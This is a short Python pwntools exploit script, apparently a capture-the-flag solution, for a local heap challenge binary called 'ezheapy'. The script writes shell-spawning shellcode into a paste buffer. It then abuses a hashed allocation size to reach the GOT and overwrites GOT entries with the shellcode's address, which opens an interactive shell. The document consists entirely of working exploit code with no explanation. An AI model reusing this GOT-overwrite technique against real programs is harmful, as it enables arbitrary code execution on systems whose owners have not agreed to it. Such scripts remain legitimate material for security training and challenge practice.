from pwn import *
from LibcSearcher import *
p = process('./ezheapy')
def add(sz):
    p.sendlineafter(b'5. Exit', b'1')
    p.sendlineafter(b'How big is your paste (bytes)?', str(sz).encode())

def edit(idx,data):
    p.sendlineafter(b'5. Exit', b'2')
    p.sendlineafter(b'What paste would you like to write to?', str(idx).encode())
    p.sendlineafter(b'Enter your input', data)

add(1024)
edit(0,asm(shellcraft.sh()))

add(0x4a15b) # hash(0x4a15b) == 0x80492eb == gotbase-0xbed
pause()
edit(1,b'A'*0xbed+p64(0xdde6c400)*20) # hash(1024) == 0xdde6c400

p.interactive()
